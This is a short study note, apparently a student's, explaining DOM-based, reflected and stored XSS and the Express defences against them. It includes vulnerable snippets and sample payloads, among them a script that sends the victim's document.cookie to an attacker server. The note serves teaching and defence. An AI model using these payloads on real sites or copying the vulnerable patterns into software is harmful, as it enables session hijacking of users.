# attacking a webpage

## DOM-Based XSS Attack
- alters DOM in victim's browser
- unsanitised input eg: from a form field
- vulnerable code in html

vulnerable code:
```js
element.innerHTML = "string made from user input";
// better to use .textContent so string will be displayed as text rather than parsed as HTML
document.write("string made from user input");
```

Malicious user input via form:
```html
<img src="bad_image" onerror="alert('Hacked!')">
```

## Reflected XSS Attack

- vulnerable code on server that responds to request

### vulnerable code

```js
const s = "Could not find product: " + req.query.q;
  result = result.toString().replace("<!-- SEARCH -->", s);
  res.send(result);
```

### request
```html
http://localhost:8000/search?q=<script>document.body.style.background = "red"</script>
```

## Stored XSS Attack
- user input (eg: comment) is saved to database
- is displayed when any user requests that content

This script sends a request tot he hacker's server, using the target's cookie as a payload.

```html
<script>fetch(`http://localhost:5000?data=${document.cookie}`)</script>
```

set `httpOnly` in the session cookie

```js
const express = require("express");
const session = require("express-session");
const helmet = require("helmet");
// ...
app.use(
  session({
    secret: "my-secret",
    resave: true,
    saveUninitialized: true,
    cookie: {
      httpOnly: true,
      secure: true
    },
  })
);
// Helmet.js is a collection of 15 Node modules that interface with Express. Each module provides configuration options for securing different HTTP headers. 
app.use(helmet());
```

## validation

```js
const { check } = require("express-validator");

app.post("/login", [
  check('email').isEmail(),
  check('password').isLength({min: 5}),
], (req, res) => {});
```